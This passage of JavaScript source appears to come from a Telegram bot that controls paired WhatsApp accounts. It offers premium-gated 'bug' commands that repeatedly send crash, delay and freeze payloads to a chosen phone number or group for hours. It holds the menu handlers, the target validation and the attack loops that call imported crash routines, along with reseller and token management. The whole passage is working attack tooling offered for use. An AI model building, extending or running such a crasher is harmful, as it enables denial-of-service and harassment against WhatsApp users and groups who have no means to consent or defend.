                await S7.answerCallbackQuery(query.id, { text: '🎉 Verification successful!', show_alert: true });
                
                // Trigger start menu
                const fakeMsg = { chat: { id: chatId }, from: query.from, text: '/start' };
                // Simulate start command
                const captionText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ ${styleText('Press Button Menu', 'fancy')} ├──────┐
└────────────────────────┘`;

                const menuButtons = {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: `${deco.fire}  𝖡𝗎𝗀 𝖬𝖾𝗇𝗎`, callback_data: 'bug_menu' }, { text: `${deco.star}  𝖬𝗂𝗌𝖼 𝖬𝖾𝗇𝗎`, callback_data: 'misc_menu' }],
                            [{ text: `${deco.rocket}  𝖢𝗁𝖺𝗇𝗇𝖾𝗅 ↗`, url: `${config.channel}` }],
                            [{ text: `${deco.ghost}  𝖦𝗋𝗈𝗎𝗉 ↗`, url: `${config.group}` }]
                        ]
                    }
                };

                await S7.editMessageCaption(captionText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: menuButtons.reply_markup
                }).catch(async () => {
                    await S7.deleteMessage(chatId, messageId).catch(() => {});
                    S7.sendPhoto(chatId, LoveLogo, {
                        caption: captionText,
                        ...menuButtons
                    });
                });
                return;
            }

            // Check verification for all other callbacks
            if (!isUserVerified(userId)) {
                await S7.answerCallbackQuery(query.id, { text: '⛔ Please verify first! Use /start', show_alert: true });
                return;
            }

            // Main Menu
            if (data === 'main_menu') {
                const mainText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ ${styleText('Press Button Menu', 'fancy')} ├──────┐
└────────────────────────┘`;

                await S7.editMessageCaption(mainText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: `${deco.fire}  𝖡𝗎𝗀 𝖬𝖾𝗇𝗎`, callback_data: 'bug_menu' }, { text: `${deco.star}  𝖬𝗂𝗌𝖼 𝖬𝖾𝗇𝗎`, callback_data: 'misc_menu' }],
                            [{ text: `${deco.rocket}  𝖢𝗁𝖺𝗇𝗇𝖾𝗅 ↗`, url: `${config.channel}` }],
                            [{ text: `${deco.ghost}  𝖦𝗋𝗈𝗎𝗉 ↗`, url: `${config.group}` }]
                        ]
                    }
                });
            }

            // Bug Menu
            else if (data === 'bug_menu') {
                const bugText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ ${styleText('BUG MENU', 'script')} ├──────┐
│ ${deco.info} Select your platform
└──────────────────────┘`;

                await S7.editMessageCaption(bugText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: `${deco.robot} 𝖠𝗇𝖽𝗋𝗈𝗂𝖽 𝖡𝗎𝗀𝗌`, callback_data: 'android_menu' }],
                            [{ text: `${deco.apple} 𝖨𝗈𝗌 𝖡𝗎𝗀𝗌`, callback_data: 'ios_menu' }],
                            [{ text: `${deco.ghost} 𝖦𝗋𝗈𝗎𝗉 𝖡𝗎𝗀𝗌`, callback_data: 'group_menu' }],
                            [{ text: `${deco.arrow} 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖬𝖺𝗂𝗇`, callback_data: 'main_menu' }]
                        ]
                    }
                });
            }

            // Android Menu
            else if (data === 'android_menu') {
                // Check if user is premium for bug commands info
                const isPremium = canUseCommands(userId);
                
                const androidText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ ${styleText('ANDROID BUGS', 'script')} ├──────┐
│➻ /crashjam [num] [hours]
│➻ /trashsystem [num] [hours]
│➻ /crashdroid [num] [hours]
│➻ /killsystem [num] [hours]
│➻ /forceblock [num] [amount]
│➻ /xbetainvis [num]
│➻ /delaymaker [num] [hours]
│➻ /delayxceed [num] [hours]
│➻ /absolutedelay [num] [hours]
│➻ /xdelayinvis [num] [hours]
│➻ /nullfinity [num] [hours]
│➻ /crashfinity [num]
└──────────────────────┘
${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}` : ''}`;

                await S7.editMessageCaption(androidText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: `${deco.arrow} 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎`, callback_data: 'bug_menu' }]
                        ]
                    }
                });
            }

            // iOS Menu
            else if (data === 'ios_menu') {
                const isPremium = canUseCommands(userId);
                
                const iosText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ ${styleText('IOS BUGS', 'script')} ├──────┐
│➻ /hidenseek [num] [hours]
│➻ /iosinvisible [num] [hours]
│➻ /iosvisible [num] [hours]
└──────────────────────┘
${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}` : ''}`;

                await S7.editMessageCaption(iosText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: `${deco.arrow} 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎`, callback_data: 'bug_menu' }]
                        ]
                    }
                });
            }

            // Group Menu
            else if (data === 'group_menu') {
                const isPremium = canUseCommands(userId);
                
                const groupText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ ${styleText('GROUP BUGS', 'script')} ├──────┐
│➻ /trashsysgp [group_id] [hours]
│➻ /xgroup [group_id] [hours]
│➻ /killgc [group_id] [hours]
│➻ /groupfriz [group_id] [hours]
│➻ /groupui [group_id] [hours]
│➻ /nullgc [group_id] [hours]
│➻ /groupfinity [group_id] [hours]
│➻ /autoclosegc [group_id] [hours]
│➻ /groupmix [group_id] [hours]
│➻ /forcegroup [group_id] [amount]
│➻ /listgc
│➻ /groupid [link]
└──────────────────────┘
${!isPremium ? `\n${deco.lock} ${styleText('PREMIUM REQUIRED TO USE', 'fancy')}` : ''}`;

                await S7.editMessageCaption(groupText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: `${deco.arrow} 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖡𝗎𝗀 𝖬𝖾𝗇𝗎`, callback_data: 'bug_menu' }]
                        ]
                    }
                });
            }

            // Misc Menu
            else if (data === 'misc_menu') {
                const miscText = MainSYLoVe(name, uptime, userId) + `
┌──────┤ ${styleText('MISC MENU', 'script')} ├──────┐
│➻ /reqpair [number]
│➻ /delpair [number]
│➻ /addprem [ID]
│➻ /delprem [ID]
│➻ /addresell [ID]
│➻ /delresell [ID]
│➻ /addtoken [token]
│➻ /deltoken [token]
│➻ /listprem
│➻ /listresell
│➻ /listuser
│➻ /mytoken
│➻ /state [0|1]
│➻ /broadcast [message]
└──────────────────────┘`;

                await S7.editMessageCaption(miscText, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: `${deco.arrow} 𝖡𝖺𝖼𝗄 𝗍𝗈 𝖬𝖺𝗂𝗇`, callback_data: 'main_menu' }]
                        ]
                    }
                });
            }

            await S7.answerCallbackQuery(query.id);
        });

        // ==================== BUG COMMANDS WITH PREMIUM CHECK ====================

        // Helper function to check premium before executing bug commands
        async function checkPremiumAndExecute(msg, commandName, executeFn) {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            
            if (!isUserVerified(userId)) {
                return S7.sendMessage(chatId, `${deco.error} ${styleText('Please verify first! Use /start', 'fancy')}`);
            }
            
            if (!canUseCommands(userId)) {
                return sendSYLove(S7, chatId);
            }
            
            return executeFn();
        }

        // ==================== EXISTING BUG COMMANDS ====================

        SYLoVe('xbetainvis', async (msg) => {
            await checkPremiumAndExecute(msg, 'xbetainvis', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const targetNum = args[1];

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /xbetainvis +921131313313`);

                const cleanTarget = targetNum.replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling xbetainvis on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    await xbetainvisLogic.xbetainvis(client, targetJid);
                } catch (err) {
                    log('error', 'xbetainvis', err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        SYLoVe(['delaymaker', 'absolutedelay', 'forceblock'], async (msg) => {
            await checkPremiumAndExecute(msg, 'delaymaker', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const cmd = args[0].slice(1);

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (args.length < 3) {
                    return S7.sendMessage(chatId, `❌ Usage: /${cmd} +921131313313 1`);
                }

                const cleanTarget = args[1].replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling ${cmd} on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    const delayFn = ms => new Promise(res => setTimeout(res, ms));

                    if (args[2] === 'only') {
                        const count = parseInt(args[3]);
                        if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                        for (let i = 0; i < count; i++) {
                            await CallLogic.CallCrash(client, targetJid);
                            await delayFn(2000);
                        }
                    } else {
                        const hours = parseInt(args[2]);
                        if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                        const endTime = Date.now() + hours * 60 * 60 * 1000;
                        while (Date.now() < endTime) {
                            await CallLogic.CallCrash(client, targetJid);
                            await delayFn(2000);
                        }
                    }
                } catch (err) {
                    log('error', cmd, err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        SYLoVe('xdelayinvis', async (msg) => {
            await checkPremiumAndExecute(msg, 'xdelayinvis', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (args.length < 3) {
                    return S7.sendMessage(chatId, `❌ Usage: /xdelayinvis +921131313313 1`);
                }

                const cleanTarget = args[1].replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling xdelayinvis on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    const delayFn = ms => new Promise(res => setTimeout(res, ms));

                    if (args[2] === 'only') {
                        const count = parseInt(args[3]);
                        if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                        for (let i = 0; i < count; i++) {
                            await XLogic.Xdelay(client, targetJid);
                            await delayFn(500);
                        }
                    } else {
                        const hours = parseInt(args[2]);
                        if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                        const endTime = Date.now() + hours * 60 * 60 * 1000;
                        while (Date.now() < endTime) {
                            await XLogic.Xdelay(client, targetJid);
                            await delayFn(500);
                        }
                    }
                } catch (err) {
                    log('error', 'xdelayinvis', err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        SYLoVe('crashfinity', async (msg) => {
            await checkPremiumAndExecute(msg, 'crashfinity', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const targetNum = args[1];

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /crashfinity +921131313313`);

                const cleanTarget = targetNum.replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling crashfinity on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    if (typeof CrashLogic.crashfinity === 'function') {
                        await CrashLogic.crashfinity(client, targetJid);
                    } else throw new Error('Function not found');
                } catch (err) {
                    log('error', 'crashfinity', err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        SYLoVe('crashdroid', async (msg) => {
            await checkPremiumAndExecute(msg, 'crashdroid', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (args.length < 3) {
                    return S7.sendMessage(chatId, `❌ Usage: /crashdroid +921131313313 1`);
                }

                const cleanTarget = args[1].replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling crashdroid on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    const delayFn = ms => new Promise(res => setTimeout(res, ms));

                    if (args[2] === 'only') {
                        const count = parseInt(args[3]);
                        if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                        for (let i = 0; i < count; i++) {
                            await CallLogic.CallCrash(client, targetJid);
                            await delayFn(2000);
                        }
                    } else {
                        const hours = parseInt(args[2]);
                        if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                        const endTime = Date.now() + hours * 60 * 60 * 1000;
                        while (Date.now() < endTime) {
                            await CallLogic.CallCrash(client, targetJid);
                            await delayFn(2000);
                        }
                    }
                } catch (err) {
                    log('error', 'crashdroid', err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        SYLoVe('killsystem', async (msg) => {
            await checkPremiumAndExecute(msg, 'killsystem', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const targetNum = args[1];

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /killsystem +921131313313`);

                const cleanTarget = targetNum.replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling killsystem on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    await killsystemLogic.killsystem(client, targetJid);
                } catch (err) {
                    log('error', 'killsystem', err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        SYLoVe('delayxceed', async (msg) => {
            await checkPremiumAndExecute(msg, 'delayxceed', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (args.length < 3) {
                    return S7.sendMessage(chatId, `❌ Usage: /delayxceed +921131313313 1`);
                }

                const cleanTarget = args[1].replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling delayxceed on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    const delayFn = ms => new Promise(res => setTimeout(res, ms));

                    if (args[2] === 'only') {
                        const count = parseInt(args[3]);
                        if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                        for (let i = 0; i < count; i++) {
                            await XLogic.Xdelay(client, targetJid);
                            await delayFn(500);
                        }
                    } else {
                        const hours = parseInt(args[2]);
                        if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                        const endTime = Date.now() + hours * 60 * 60 * 1000;
                        while (Date.now() < endTime) {
                            await XLogic.Xdelay(client, targetJid);
                            await delayFn(500);
                        }
                    }
                } catch (err) {
                    log('error', 'delayxceed', err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        SYLoVe('nullfinity', async (msg) => {
            await checkPremiumAndExecute(msg, 'nullfinity', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const targetNum = args[1];

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /nullfinity +921131313313`);

                const cleanTarget = targetNum.replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling nullfinity on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    await XLogic.Xdelay(client, targetJid);
                    await CrashLogic.crashfinity(client, targetJid);
                } catch (err) {
                    log('error', 'nullfinity', err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        // ==================== NEW ANDROID BUG COMMANDS ====================

        SYLoVe(['crashjam', 'trashsystem'], async (msg) => {
            await checkPremiumAndExecute(msg, 'crashjam', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const s7CM = args[0].slice(1);

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (args.length < 3) {
                    return S7.sendMessage(chatId, `❌ Usage: /${s7CM} +921131313313 1`);
                }

                const cleanTarget = args[1].replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling ${s7CM} on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    const delayMs = 2000;

                    if (args[2] === 'only') {
                        const count = parseInt(args[3]);
                        if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                        
                        for (let i = 0; i < count; i++) {
                            await crashjamLogic.crashjam(client, targetJid);
                            await new Promise(res => setTimeout(res, delayMs));
                        }
                    } else {
                        const hours = parseInt(args[2]);
                        if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                        
                        const endTime = Date.now() + hours * 60 * 60 * 1000;
                        while (Date.now() < endTime) {
                            await crashjamLogic.crashjam(client, targetJid);
                            await new Promise(res => setTimeout(res, delayMs));
                        }
                    }
                } catch (err) {
                    log('error', s7CM, err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        // ==================== NEW GROUP BUG COMMANDS ====================

        SYLoVe(['killgc', 'groupfriz'], async (msg) => {
            await checkPremiumAndExecute(msg, 'killgc', async () => {
                try {
                    const chatId = msg.chat.id.toString();
                    const userId = msg.from.id.toString();
                    const args = msg.text.split(' ');
                    const s7CM = args[0].slice(1);
                    const targetNum = args[1];
                    const durationArg = args[2];

                    const session = GetSessionForUser(userId, chatId);
                    if (session.error) return S7.sendMessage(chatId, session.error);
                    const client = session.sock;

                    if (!targetNum || !targetNum.endsWith('@g.us')) {
                        return S7.sendMessage(chatId, `❌ Provide a valid group JID.\nExample: /${s7CM} 123456@g.us 1`);
                    }
                    
                    if (!durationArg) {
                        return S7.sendMessage(chatId, `❌ Provide duration in hours.\nExample: /${s7CM} 123456@g.us 1`);
                    }
                    
                    const hours = parseInt(durationArg);
                    if (isNaN(hours) || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid duration');

                    const targetJid = targetNum.trim();

                    log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours}h`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });

                    const delayMs = 2000;
                    const endTime = Date.now() + hours * 60 * 60 * 1000;

                    while (Date.now() < endTime) {
                        await gcFrzLogic.gcFrz(client, targetJid);
                        await new Promise(res => setTimeout(res, delayMs));
                    }

                } catch (err) {
                    log('error', s7CM, err.message);
                    await S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
                }
            });
        });

        SYLoVe('trashsysgp', async (msg) => {
            await checkPremiumAndExecute(msg, 'trashsysgp', async () => {
                try {
                    const chatId = msg.chat.id.toString();
                    const userId = msg.from.id.toString();
                    const args = msg.text.split(' ');
                    const s7CM = args[0].slice(1);
                    const targetNum = args[1];
                    const durationArg = args[2];

                    const session = GetSessionForUser(userId, chatId);
                    if (session.error) return S7.sendMessage(chatId, session.error);
                    const client = session.sock;

                    if (!targetNum || !targetNum.endsWith('@g.us')) {
                        return S7.sendMessage(chatId, `❌ Provide a valid group JID.\nExample: /${s7CM} 123456@g.us 1`);
                    }
                    
                    if (!durationArg) {
                        return S7.sendMessage(chatId, `❌ Provide duration in hours.\nExample: /${s7CM} 123456@g.us 1`);
                    }
                    
                    const hours = parseInt(durationArg);
                    if (isNaN(hours) || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid duration');

                    const targetJid = targetNum.trim();

                    log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours}h`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });

                    const delayMs = 2000;
                    const endTime = Date.now() + hours * 60 * 60 * 1000;

                    while (Date.now() < endTime) {
                        await killsystemLogic.killsystem(client, targetJid);
                        await gcFrzLogic.gcFrz(client, targetJid);
                        await new Promise(res => setTimeout(res, delayMs));
                    }

                } catch (err) {
                    log('error', s7CM, err.message);
                    await S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
                }
            });

        // ==================== EXISTING iOS BUG COMMANDS ====================

        SYLoVe(['iosinvisible', 'iosvisible'], async (msg) => {
            await checkPremiumAndExecute(msg, 'iosinvisible', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');
                const cmd = args[0].slice(1);

                const session = GetSessionForUser(userId, chatId);

if (session.error) {
    return S7.sendMessage(chatId, session.error);
}

const client = session.sock;

                if (args.length < 3) {
                    return S7.sendMessage(chatId, `❌ Usage: /${cmd} +921131313313 1`);
                }

                const cleanTarget = args[1].replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling ${cmd} on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    const delayFn = ms => new Promise(res => setTimeout(res, ms));

                    if (args[2] === 'only') {
                        const count = parseInt(args[3]);
                        if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                        for (let i = 0; i < count; i++) {
                            await IosLogic.IosInvisible(client, targetJid);
                            await delayFn(500);
                        }
                    } else {
                        const hours = parseInt(args[2]);
                        if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                        const endTime = Date.now() + hours * 60 * 60 * 1000;
                        while (Date.now() < endTime) {
                            await IosLogic.IosInvisible(client, targetJid);
                            await delayFn(500);
                        }
                    }
                } catch (err) {
                    log('error', cmd, err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        SYLoVe('hidenseek', async (msg) => {
            await checkPremiumAndExecute(msg, 'hidenseek', async () => {
                const chatId = msg.chat.id.toString();
                const userId = msg.from.id.toString();
                const args = msg.text.split(' ');

                const session = GetSessionForUser(userId, chatId);
                if (session.error) return S7.sendMessage(chatId, session.error);
                const client = session.sock;

                if (args.length < 3) {
                    return S7.sendMessage(chatId, `❌ Usage: /hidenseek +921131313313 1`);
                }

                const cleanTarget = args[1].replace(/[^0-9]/g, '');
                const targetJid = `${cleanTarget}@s.whatsapp.net`;

                try {
                    const [exists] = await client.onWhatsApp(targetJid);
                    if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);

                    log('command', msg.from.first_name, `Calling hidenseek on ${cleanTarget}`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });

                    const delayFn = ms => new Promise(res => setTimeout(res, ms));

                    if (args[2] === 'only') {
                        const count = parseInt(args[3]);
                        if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                        for (let i = 0; i < count; i++) {
                            await IosLogic.IosInvisible(client, targetJid);
                            await delayFn(500);
                        }
                    } else {
                        const hours = parseInt(args[2]);
                        if (!hours || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid time');
                        const endTime = Date.now() + hours * 60 * 60 * 1000;
                        while (Date.now() < endTime) {
                            await IosLogic.IosInvisible(client, targetJid);
                            await delayFn(500);
                        }
                    }
                } catch (err) {
                    log('error', 'hidenseek', err.message);
                    S7.sendMessage(chatId, `❌ Error: ${err.message}`);
                }
            });
        });

        // ==================== EXISTING GROUP BUG COMMANDS ====================

        SYLoVe(['nullgc', 'xgroup', 'groupfinity', 'autoclosegc', 'groupui', 'groupmix', 'forcegroup'], async (msg) => {
            await checkPremiumAndExecute(msg, 'nullgc', async () => {
                try {
                    const chatId = msg.chat.id.toString();
                    const userId = msg.from.id.toString();
                    const args = msg.text.split(' ');
                    const cmd = args[0].slice(1);
                    const targetJid = args[1];
                    const durationArg = args[2];

                    const session = GetSessionForUser(userId, chatId);
                    if (session.error) return S7.sendMessage(chatId, session.error);
                    const client = session.sock;

                    if (!targetJid || !targetJid.endsWith('@g.us')) {
                        return S7.sendMessage(chatId, `❌ Provide a valid group JID.\nExample: /${cmd} 123456@g.us 1`);
                    }
                    if (!durationArg) {
                        return S7.sendMessage(chatId, `❌ Provide duration in hours.\nExample: /${cmd} 123456@g.us 1`);
                    }
                    const hours = parseInt(durationArg);
                    if (isNaN(hours) || hours <= 0) return S7.sendMessage(chatId, '❌ Invalid duration');

                    log('command', msg.from.first_name, `Calling ${cmd} on ${targetJid} for ${hours}h`);
                    await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });

                    const delayFn = ms => new Promise(res => setTimeout(res, ms));
                    const endTime = Date.now() + hours * 60 * 60 * 1000;

                    while (Date.now() < endTime) {
                        await XgcLogic.Xgc(client, targetJid);
                        await delayFn(2000);
                    }
                } catch (err) {
                    log('error', 'groupcmds', err.message);
                    S7.sendMessage(msg.chat.id, `❌ Error: ${err.message}`);
                }
            });
        });

        SYLoVe('listgc', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();

            if (!isUserVerified(userId)) {
                return S7.sendMessage(chatId, `${deco.error} ${styleText('Please verify first! Use /start', 'fancy')}`);
            }

            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);

            if (!waSessions || Object.keys(waSessions).length === 0) {
                return S7.sendMessage(chatId, '❌ No Number connected please use /reqpair to connect');
            }

            let text = `⬣ <b>LIST OF WHATSAPP GROUPS</b>\n\n`;
            let totalGroups = 0;
            let index = 1;

            for (const chatKey of Object.keys(waSessions)) {
                for (const session of waSessions[chatKey]) {
                    const sock = session.sock;
                    const num = session.num;

                    try {
                        const groupsObj = await sock.groupFetchAllParticipating();
                        const groups = Object.values(groupsObj);

                        if (groups.length === 0) continue;

                        text += `📱 <b>Number:</b> <code>${num}</code>\n`;
                        text += `━━━━━━━━━━━━━━━\n`;

                        for (const group of groups) {
                            const meta = await sock.groupMetadata(group.id);

                            text += `❏ Group ${index++}\n`;
                            text += `│⭔ <b>Name:</b> ${meta.subject}\n`;
                            text += `│⭔ <b>ID:</b> <code>${meta.id}</code>\n`;
                            text += `│⭔ <b>Members:</b> ${meta.participants.length}\n`;
                            text += `╰──────────────\n\n`;

                            totalGroups++;
                        }
                    } catch (err) {
                        log('error', 'LISTGC', `Failed for ${num}: ${err.message}`);
                    }
                }
            }

            if (totalGroups === 0) {
                return S7.sendMessage(chatId, '❌ No groups found on connected numbers.');
            }

            text =
                `⬣ <b>LIST OF GROUP BELOW</b>\n\n` +
